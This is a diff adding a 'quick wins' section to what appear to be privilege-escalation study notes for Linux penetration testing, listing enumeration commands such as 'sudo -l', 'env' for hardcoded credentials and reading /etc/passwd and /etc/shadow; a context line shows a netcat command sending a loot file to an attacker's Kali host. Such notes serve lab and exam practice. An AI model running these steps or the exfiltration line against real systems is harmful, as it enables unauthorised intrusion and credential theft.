@@ -91,3 +91,45 @@ nc <kali ip> 80 < loot.txt
 ```
 
 -------------------
+## Checking for the Quick Wins
+
+1) The first few commands you SHOULD ALWAYS RUN in this:
+
+```bash
+# check your group
+id
+# check your history
+history
+# check your sudo powers
+sudo -l
+# check your environment variables
+env
+```
+
+If you see groups like docker, backup, disk, adm, or anything that is just not your username. These are things that are either PE vectors or things you should investigate as being in those groups can give you certain powers. Note down!
+
+sudo -l can reveal quick wins and more often than not THE PE vector. 
+
+env to check for hardcoded credentials
+
+2) The second thing is user enumeration and user home directories enumeration
+
+```
+cat /etc/passwd
+
+ls -la /etc/passwd /etc/shadow  # might as well see if you can write to passwd or read shadow for an easy win
+
+# ls -laRH lists all files recursively (including hidden) and outputs in human readable form. This is a godly command to quickly spider down directories
+
+# you ls -laRH /home so that you can quickly see what files are in each user's directory (provided you can access them)
+
+ls -laRH /home
+```
+
+3) The third thing you should do is to enumerate the world writable directories. Any thing inside that is not the default files should be investigated.
+
+```bash
+ls -la /tmp /opt /dev/shm /var/tmp
+```
+
+
